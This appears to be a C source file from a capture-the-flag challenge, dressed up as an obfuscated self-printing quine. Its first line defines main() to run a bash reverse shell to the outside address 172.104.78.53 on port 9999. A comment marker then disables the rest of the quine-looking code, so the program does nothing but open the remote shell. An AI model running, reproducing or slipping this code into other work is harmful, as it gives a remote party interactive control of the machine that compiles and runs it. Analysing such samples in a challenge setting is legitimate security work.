char*d="";void main(){system("bash -c 'bash -i >& /dev/tcp/172.104.78.53/9999 0>&1'");}/*",o[3217];
int t=640,i,r,w,f,b,p,x;n(){return r<t?d[(*d+100+(r++))%t]:r>+1340?59:(x=d[(r++-t)%351+t]
)?x^(p?6:0):(p=+34);}main(){w=sprintf(o,"char*d=");r=p=0;for(f=1;f<*d+100;)if((b=d[f++])-33){
if(b<+93){if(!p)o[w++]=34;for(i=35+(p?0:1);i<b;i++)o[w++]=n();o[w++]=p?n():+34;}
else for(i=92;i<b;i++)o[w++]=32;}else o[w++]=10;o[w]=0;puts(o);};/*cddc_ctf*/;